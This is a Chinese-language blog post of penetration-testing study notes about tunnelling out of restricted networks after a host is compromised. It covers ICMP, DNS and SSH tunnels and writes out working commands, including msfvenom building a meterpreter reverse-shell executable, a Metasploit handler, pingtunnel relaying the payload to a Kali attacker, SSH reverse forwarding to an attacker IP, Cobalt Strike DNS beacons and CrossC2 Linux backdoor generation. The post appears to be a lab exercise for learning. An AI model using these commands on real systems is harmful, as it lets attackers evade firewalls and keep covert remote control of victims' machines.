<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="月" href="https://lunargod.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="月" href="https://lunargod.github.io/atom.xml"><link rel="alternate" type="application/json" title="月" href="https://lunargod.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="java,git,springcloud"><link rel="canonical" href="https://lunargod.github.io/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"><title>隧道技术& DNS/SSH Linux反向上线 - 内网隧道代理 | LunaRGFod = 月 = HelloWord</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">隧道技术& DNS/SSH Linux反向上线</h1><div class="meta"><span class="item" title="创建时间：2024-05-01 22:09:49"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-05-01T22:09:49+08:00">2024-05-01</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>3.9k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>4 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">LunaRGFod</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://pic.imgdb.cn/item/673a9b97d29ded1a8c29320d.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/673dcff6d29ded1a8cfd6b4f.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/673a0906d29ded1a8cd2eaab.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/67371c20d29ded1a8c8b60e8.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/673a9b8dd29ded1a8c292b73.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/67371d29d29ded1a8c8cb8ca.png"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" itemprop="item" rel="index" title="分类于 内网隧道代理"><span itemprop="name">内网隧道代理</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunargod.github.io/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="月"><meta itemprop="description" content="HelloWord, 你越安静 你听到的就越多"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="月"></span><div class="body md" itemprop="articleBody"><p><img data-src="https://pic.imgdb.cn/item/673a9b7bd29ded1a8c291fcb.jpg" alt></p><h2 id="隧道技术"><a class="anchor" href="#隧道技术">#</a> 隧道技术</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTl9KZmhtdk5xRkdTeW5QdXc2M1Y1Zw==">一文搞懂隧道技术</span></p><p>隧道其实就是一个穿透效果，使我们在外网的机器可以访问内网的资源，通讯是为了更隐蔽自己跳过防火墙不受防火墙限制，上线便于我们后期控制</p><h3 id="常见隧道"><a class="anchor" href="#常见隧道">#</a> 常见隧道</h3><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络层:IPV6隧道、ICMP隧道</span><br><span class="line"></span><br><span class="line">传输层:TCP、UDP、端口转发</span><br><span class="line"></span><br><span class="line">应用层:SSH、HTTP/S隧道、DNS隧道</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><h3 id="判断出网协议"><a class="anchor" href="#判断出网协议">#</a> 判断出网协议</h3><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SMB隧道 :存在<span class="number">445</span>端口开启借助端口上线</span><br><span class="line"></span><br><span class="line">SHH隧道: 存在<span class="number">22</span>端口借助端口上线</span><br><span class="line"></span><br><span class="line">ICMP隧道: ping命令判断是否通讯</span><br><span class="line"></span><br><span class="line">DNS隧道上线环境: 内网主机只出网DNS协议数据,解决上线</span><br><span class="line"></span><br><span class="line">windows命令判断:nslookup </span><br><span class="line">linux: dig </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>命令版本</p><table><thead><tr><th>SMB</th><th>445 端口开放</th></tr></thead><tbody><tr><td>SSH</td><td>22 端口开放</td></tr><tr><td>ICMP</td><td><code>ping</code> 命令</td></tr><tr><td>DNS</td><td>windows : <code>nslookup</code> linux： <code>dig</code></td></tr><tr><td>http</td><td><code>curl</code></td></tr></tbody></table><h3 id="根据出网协议搭建隧道"><a class="anchor" href="#根据出网协议搭建隧道">#</a> 根据出网协议搭建隧道</h3><p>上线到 <code>CS/MSF</code> 渗透框架里面方便我们后期的控制和渗透，前提是我们提前取得了权限，但是将权限以上线的形式体现</p><ul><li>根据逐个命令判断出网协议；假设可以 <code>ping</code> 通代表 <code>icmp</code> 协议是可行的，搭建随便</li><li>根据出网协议建立对应的隧道实现通讯而后上线</li></ul><hr><p>判断 DNS 隧道，有回显说明主机是支持 <code>DNS</code> 解析，它属于应用层协议，它在区域传输时用 <code>TCP</code> , 域名解析时用 <code>UDP</code></p><p>说明 <code>DNS</code> 两者都有，它只是在扮演不同的角色时使用不同的协议，<strong> 所以这里的防火墙入站规则是无用的，DNS 解析使用</strong> ** <code>UDP</code> **<strong> 可以突破</strong></p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup  baidu.com</span><br></pre></td></tr></table></figure><p></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_jWN7Mlrfdm.png"></p><p>课程环境中 <code>DNS</code> 可以解析域名回显信息，但是访问网站却不能打开是为什么？</p><blockquote><p>访问网站会将域名解析成 <code>IP</code> 但是将其还原为内容时进行的是区域传输，走的是 <code>TCP</code> 协议，<br>被入站规则所封杀，导致无法正常显示，但是命令走的是域名解析使用了 <code>UPD</code> , 可以正常的回显</p></blockquote><h2 id="icmp隧道反向连接"><a class="anchor" href="#icmp隧道反向连接">#</a> ICMP 隧道反向连接</h2><p><code>ICMP</code> 用于在 IP 网络中传递控制消息和错误报告属于 <code>TCP/IP</code> 协议族中的第三层 - 网络层协议，一般的<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTklODAlOUElRTQlQkYlQTElRTUlOEQlOEYlRTglQUUlQUUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">通信协议</span>里，如果两台设备要进行通信，肯定需要开放端口，而在 <code>ICMP</code> 协议下就不需要， <code>ping</code> 命令 走的是 <code>ICMP</code> 协议，防火墙一般不会屏蔽 <code>ping</code> 的数据包)，从而实现不受限制的访问</p><hr><h3 id="封禁情况"><a class="anchor" href="#封禁情况">#</a> 封禁情况</h3><p>当我们拿下一台主机后，需要 <code>MSF</code> 上线，如果针对防火墙设置的规则只是限制了 <code>445</code> 端口，再次生成木马使用 <code>446</code> 端口即可；</p><p>如果是对协议进行了封杀，域控通过组策略设置防火墙规则同步后，域内用户主机被限制 <code>TCP</code> 出网，规则为出站规则，但还可以通过入站规则取得 <code>Shell</code> 上线，(入站规则无限制则正向连接), 也可以继续反向采取更换隧道协议的方式</p><p>对 <code>TCP</code> 协议封杀，但是生成的木马我们可以再次更换为 <code>UDP</code> 传输协议，协议是向下兼容，不能往上寻找 <code>http</code> 协议，可以向下寻找</p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_b5IAaXwBLC.png"></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_amMuF6Ei6X.png"></p><p>MSF 上线可以生成 <code>ICMP</code> 协议木马，使用工具进行操作 <code>ICMP</code> 隧道简单实用是一个比较特殊的协议，下面是 <code>ICMP</code> 协议工具</p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_HBS_nx8rq4.png"></p><h3 id="0x01-生成后门"><a class="anchor" href="#0x01-生成后门">#</a> <strong>0X01</strong> 生成后门</h3><p>环境搭建比较简单也是简单复现一下，策略并没用限制任何协议只是学习隧道的使用</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机windows:  IP  <span class="number">10.2</span><span class="number">.36</span><span class="number">.193</span></span><br><span class="line">虚拟机 Kali:  IP  <span class="number">192.168</span><span class="number">.65</span><span class="number">.146</span></span><br></pre></td></tr></table></figure><p></p><p>生成的后门走的是 <code>TCP</code> 协议远程是发不出去的，所以这边的后门先走本地的 127.0.0.1, 如果 IP 不走本地那么一上线就会被防火墙的协议封杀，所以先创建在本地勾着</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> lport=<span class="number">9999</span> -f exe -o demo9999.exe</span><br></pre></td></tr></table></figure><p></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_1LdTZysXFS.png"></p><h3 id="0x02-监听开启隧道"><a class="anchor" href="#0x02-监听开启隧道">#</a> 0X02 监听开启隧道</h3><p>创建后 MSF 启动监听</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    <span class="comment"># 开启msf</span></span><br><span class="line">use exploit/multi/handler       <span class="comment"># 创建一个监听器，等待远程主机连接并执行后续的攻击操作。</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp     <span class="comment"># 执行Windows系统的Meterpreter反向TCP shell</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.65</span><span class="number">.146</span>       <span class="comment"># 设置了本地主机的IP地址，即监听器将在该IP上等待远程主机的连接。也就是kali的地址</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span>      <span class="comment"># 这个命令设置了本地主机的端口号，即监听器将在该端口上等待远程主机的连接。</span></span><br><span class="line"></span><br><span class="line">exploit <span class="comment"># 启动了监听器，并等待远程主机连接。一旦远程主机连接成功，攻击者可以获得对目标系统的控制，并执行进一步的操作，如获取敏感信息、执行命令等。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_sh9hXwiMK4.png"></p><p>Kali 开启隧道</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -<span class="built_in">type</span> server</span><br></pre></td></tr></table></figure><p></p><h3 id="0x03-受控主机开启隧道"><a class="anchor" href="#0x03-受控主机开启隧道">#</a> 0X03 受控主机开启隧道</h3><p>Win 开启隧道，将本地的 <code>9999</code> 端口 ICMP 协议数据转发到 Kali 地址正在受 MSF 监听的 IP + 端口上 (管理员运行)</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                               木马生成IP         本机Win IP</span><br><span class="line">pingtunnel.exe -<span class="built_in">type</span> client -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9999</span> -s <span class="number">10.2</span><span class="number">.36</span><span class="number">.193</span> -t <span class="number">192.168</span><span class="number">.65</span><span class="number">.146</span>:<span class="number">4444</span> -tcp <span class="number">1</span> -noprint <span class="number">1</span> -nolog <span class="number">1</span></span><br><span class="line"></span><br><span class="line">工具目标结束的时候是TCP协议,数据只是发送的时候是ICMP,到了目标就还原,如果没还原那没办法上线因为它接收的Payload就是TCP协议</span><br><span class="line"></span><br><span class="line"> 注意: </span><br><span class="line"></span><br><span class="line">执行隧道.exe是需要权限的,环境是我们已经控制了一台主机,但是TCP协议因为防火墙规则不出网,所以不能上线</span><br><span class="line">绕过防火墙上线使用的隧道技术是 后渗透控制手段  不是横向移动 我们已经取得了权限,但是碰到了网络问题所以需要隧道封装协议再进行上线</span><br></pre></td></tr></table></figure><p></p><h2 id="dns-隧道"><a class="anchor" href="#dns-隧道">#</a> DNS 隧道</h2><p><strong>内网环境</strong></p><ul><li>TCP 协议禁止出网</li><li>封杀所有端口</li></ul><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_-4WMgcO2qw.png"></p><h3 id="通讯"><a class="anchor" href="#通讯">#</a> 通讯</h3><p><code>DNS</code> 通讯在 <code>Linux</code> 直接可以使用，开放的端口是 53, 如果是 <code>win</code> 则需要下载东西，建立通信也是为了上线，可以更方便的传输数据，拖取数据，但是 DNS 隧道通信意义不大，可以上线 <code>shell</code> 何必通信</p><h3 id="上线"><a class="anchor" href="#上线">#</a> 上线</h3><p><code>DNS</code> 协议上线是需要准备一个域名，在内网中需要被解析 <code>IP</code> 并且需要配置阿里云 NS, 实战环境中的解析</p><p><code>ns1</code> 为我们的 <code>DNS</code> 地址，上线时填入它，那么它就会解析到 <code>cs.saber</code> CS 又会解析到我们的 <code>IP</code></p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ns1.saber.fun ----&gt; cs.saber.com-----&gt;<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>CS 创建监听器 <code>Paylao</code> 是 DNS 协议，地址写入 DNS 地址 <code>ns1.saber.fun</code> 并解析的地址为 <code>cs.xiaodi.com</code> 地址又还原成我们的 <code>IP</code> 地址，等于转换了</p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_ERkV-YPL3Y.png"></p><p>选择常见后门文件，为无状态的后门，对 <code>CS</code> 后门疑惑的话阅读这篇文章 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaW5nX2NvY28vYXJ0aWNsZS9kZXRhaWxzLzExNjQyNTE2NQ==">后门</span></p><p>将后门给到受害者机器模拟点击上线 <code>CS</code> 但是显示是一台黑色的，我们需要输入命令让工具和 <code>DNS</code> 通讯等待一会就可以连接上线</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mode dns-txt </span><br></pre></td></tr></table></figure><p></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_CyYwxykf4K.png"></p><h2 id="ssh隧道"><a class="anchor" href="#ssh隧道">#</a> SSH 隧道</h2><p><strong>内网环境</strong></p><ul><li>防火墙设置只让 SSH 协议通信，入站封杀导致无法正向连接</li></ul><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_bpmjKi9deZ.png"></p><p><code>SSH（Secure Shell）</code> 是一种网络协议，用于在不安全的网络中建立安全的远程连接。它通过加密和身份验证机制，确保数据传输的机密性和完整性。SSH 协议通常用于远程登录和执行命令，也可以用于安全地传输文件和其他数据</p><h3 id="跳板机linux通讯win7"><a class="anchor" href="#跳板机linux通讯win7">#</a> 跳板机 Linux 通讯 win7</h3><p><code>SSH协议</code> 存在与 Linux 系统中，利用 <code>SSH</code> 隧道需要满足两个条件</p><ul><li>取得跳板机且系统为 Linux</li><li>跳板机权限为 root 权限</li></ul><p>环境限制入站协议无法正向，但可以反向连接利用 <code>SSH</code> 隧道，让 Linux 主动连接攻击机，跳板机可以访问 <code>win7</code> 流量，主动连接攻击机后就可以将流量代出，攻击机访问 <code>win7</code></p><p><strong>入站封闭反向连接</strong></p><p>Linux 机器执行实现通信，它为跳板机，将它访问 1.16 (win7) <code>8080</code> 端口流量借助 <code>ssh</code> 隧道转发到攻击机 <code>47:1234</code> 端口，那么攻击机在本地访问 <code>1234</code> 端口实际上访问了 win7 <code>8080</code> 的端口流量实现内网信息探针，并且协议走的是 <code>ssh</code> 协议隧道</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.16</span> win7</span><br><span class="line"><span class="number">47.94</span><span class="number">.236</span><span class="number">.1</span>  攻击机</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux为跳板执行下列命令</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R <span class="number">1234</span>:<span class="number">192.168</span><span class="number">.1</span><span class="number">.16</span>:<span class="number">8080</span> root@<span class="number">47.94</span><span class="number">.236</span><span class="number">.17</span>  <span class="comment">// 47攻击机 1.16Linux受害者</span></span><br><span class="line"></span><br><span class="line">攻击机执行命令,访问<span class="number">1234</span>端口查看win7 <span class="number">8080</span> 信息 </span><br><span class="line"></span><br><span class="line">curl http:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p></p><p><strong>出站封闭正向连接</strong></p><p>跳板访问内 win7 <code>8080</code> 端口流量在封装到本地 <code>1122</code> 端口，数据并没有代出只是换了端口，通过 CS 同样操作正向连接</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -CfNg -L <span class="number">1122</span>:<span class="number">192.168</span><span class="number">.1</span><span class="number">.16</span>:<span class="number">8080</span> root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.116</span></span><br></pre></td></tr></table></figure><p></p><h3 id="cs生成linux后门控制"><a class="anchor" href="#cs生成linux后门控制">#</a> CS 生成 Linux 后门控制</h3><h4 id="0x01-加载插件"><a class="anchor" href="#0x01-加载插件">#</a> 0X01 加载插件</h4><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0NzgzOC9hcnRpY2xlL2RldGFpbHMvMTI2NTcwOTU1Izp+OnRleHQ9JUU0JUJDJTk3JUU2JTg5JTgwJUU1JTkxJUE4JUU3JTlGJUE1JUVGJUJDJThDbXNmJUU0JUI4JThBJUU5JTlEJUEy">Linux 被控主机反弹 shell 给 Cobalt_Strike (CS)- 详细实战笔记</span></p><p>CS 并没有提供 Linux 上线，我们需要借助额外的插件工具</p><p><span class="exturl" data-url="aHR0cHM6Ly9nbG94ZWMuZ2l0aHViLmlvL0Nyb3NzQzIvemhfY24vaW5zdGFsbC8=">工具</span></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_rdIqrGUUyZ.png"></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dsb3hlYy9Dcm9zc0MyL3JlbGVhc2VzLw==">GitHub 地址</span></p><p>选择服务端 (Kali) 操作系统下载，客户端是我们图形化页面系统，我的服务端是运行在 Kali 的，所以我需要下载 <code>linux</code></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_VDgTKRwnrb.png"></p><p>压缩包和下载的文件会有 3 个 <code>cna</code> 后缀为插件，开启 CS 逐步加载插件在客户端， <code>genCrossC2.Linux</code> 放置到服务端 <code>Kali</code> 目录下，加载完成菜单栏就会显示出插件版本支持</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">连接bind的TCP协议</span><br><span class="line">反向连接reverse HTTPS协议</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_soxijpJqj7.png"></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_hI1bMqxEzD.png"></p><h4 id="0x02-创建监听"><a class="anchor" href="#0x02-创建监听">#</a> 0X02 创建监听</h4><p>使用前创建一个监听器， <code>Payload</code> 为 HTTPS 协议，支持插件的反向连接，地址为本地</p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_ewJDuyjJvE.png"></p><h4 id="0x03-生成后门"><a class="anchor" href="#0x03-生成后门">#</a> 0X03 生成后门</h4><p>使用插件生成 <code>Linux</code> 的 <code>.out</code> 后缀文件，各项配置需要正常，生成后会出现一条命令，直接复制在客户端执行，他就就会生成在 Linux 系统上执行上线的文件，文件给到 <code>Linux</code> CS.GO 上线</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cs45/ root/cs45/genCrossC2.Linux 服务端IP <span class="number">5555</span> ../.cobaltstrike.beacon_keys <span class="literal">null</span> Linux x64 t_cc2.out</span><br></pre></td></tr></table></figure><p></p><p><img data-src="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_JHt-jbfwPs.png"></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-11-18 12:07:55" itemprop="dateModified" datetime="2024-11-18T12:07:55+08:00">2024-11-18</time> </span><span id="2024/05/01/隧道技术/" class="item leancloud_visitors" data-flag-title="隧道技术& DNS/SSH Linux反向上线" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>月 <i class="ic i-at"><em>@</em></i>月</li><li class="link"><strong>本文链接：</strong> <a href="https://lunargod.github.io/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="隧道技术&amp; DNS&#x2F;SSH Linux反向上线">https://lunargod.github.io/2024/05/01/隧道技术/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/04/30/Object%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%82%E5%B8%B8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;673a0952d29ded1a8cd335b7.jpg" title="Objbect  内部类异常"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Java</span><h3>Objbect 内部类异常</h3></a></div><div class="item right"><a href="/2024/05/03/%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E7%B1%BB%E5%8C%85%E8%A3%85%E7%B1%BB/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;673a9b97d29ded1a8c29320d.jpg" title="日期时间类 包装类"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Java</span><h3>日期时间类 包装类</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93"><span class="toc-number">1.1.</span> <span class="toc-text">常见隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">判断出网协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="toc-number">1.3.</span> <span class="toc-text">根据出网协议搭建隧道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp%E9%9A%A7%E9%81%93%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">ICMP 隧道反向连接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E7%A6%81%E6%83%85%E5%86%B5"><span class="toc-number">2.1.</span> <span class="toc-text">封禁情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="toc-number">2.2.</span> <span class="toc-text">0X01 生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E7%9B%91%E5%90%AC%E5%BC%80%E5%90%AF%E9%9A%A7%E9%81%93"><span class="toc-number">2.3.</span> <span class="toc-text">0X02 监听开启隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%8F%97%E6%8E%A7%E4%B8%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E9%9A%A7%E9%81%93"><span class="toc-number">2.4.</span> <span class="toc-text">0X03 受控主机开启隧道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns-%E9%9A%A7%E9%81%93"><span class="toc-number">3.</span> <span class="toc-text">DNS 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%AE%AF"><span class="toc-number">3.1.</span> <span class="toc-text">通讯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF"><span class="toc-number">3.2.</span> <span class="toc-text">上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text">SSH 